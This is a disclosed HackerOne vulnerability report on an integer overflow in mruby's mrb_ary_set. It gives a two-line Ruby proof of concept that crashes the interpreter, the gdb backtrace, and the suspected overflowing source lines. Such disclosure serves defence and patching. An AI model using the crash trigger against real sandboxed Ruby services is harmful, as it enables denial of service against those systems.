# Integer Overflow in mrb_ary_set

## Report Details
- **Report ID**: 192235
- **URL**: https://hackerone.com/reports/192235
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-12-18T16:31:25.215Z
- **Disclosed**: 2017-01-12T03:09:35.290Z

## Reporter
- **Username**: tunz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Hi,

I found a crash in mruby. I frankly couldn't reproduce it in mruby-engine. I think it is because of memory limitation, but I'm not sure.

Here is a PoC (when the size of MRB_INT is 32). 

```ruby
ary = Array.new(0)
ary[0x7fffffff] = 1
```

```
$ gdb -q --args ./bin/mruby ./test.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby ./test.rb

Program received signal SIGSEGV, Segmentation fault.
0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104
104         *ptr++ = nil;
(gdb) list
99      ary_fill_with_nil(mrb_value *ptr, mrb_int size)
100     {
101       mrb_value nil = mrb_nil_value();
102
103       while (size--) {
104         *ptr++ = nil;
105       }
106     }
107
108     static void
(gdb) x/i $pc
=> 0x4146a8 <ary_fill_with_nil+50>:     mov    QWORD PTR [rcx],rax
(gdb) i r rcx
rcx            0x1357000        20279296
(gdb) bt
#0  0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104
#1  0x0000000000415ab1 in mrb_ary_set (mrb=0x12d2010, ary=..., n=2147483647, val=...)
    at /home/tunz/working/mruby/mruby/src/array.c:564
#2  0x0000000000416266 in mrb_ary_aset (mrb=0x12d2010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:798
#3  0x000000000043032c in mrb_vm_exec (mrb=0x12d2010, proc=0x12d5210, pc=0x133a020) at /home/tunz/working/mruby/mruby/src/vm.c:1171
#4  0x000000000042e850 in mrb_vm_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:772
#5  0x00000000004367f6 in mrb_top_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:2487
#6  0x0000000000446ea4 in mrb_load_exec (mrb=0x12d2010, p=0x132e2c0, c=0x132cf30)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755
#7  0x0000000000446f3a in mrb_load_file_cxt (mrb=0x12d2010, f=0x132df00, c=0x132cf30)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764
#8  0x00000000004024f8 in main (argc=2, argv=0x7fff6f302128)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232
```

I think the root cause of this bug is the following line:
```C
 548 MRB_API void
 549 mrb_ary_set(mrb_state *mrb, mrb_value ary, mrb_int n, mrb_value val)
 550 {
...
 562     if (a->aux.capa <= n)
 563       ary_expand_capa(mrb, a, n + 1); // <- n + 1 can be overflowed?
 564     ary_fill_with_nil(a->ptr + a->len, n + 1 - a->len);
 565     a->len = n + 1;
 566   }
```

## Attachments
No attachments
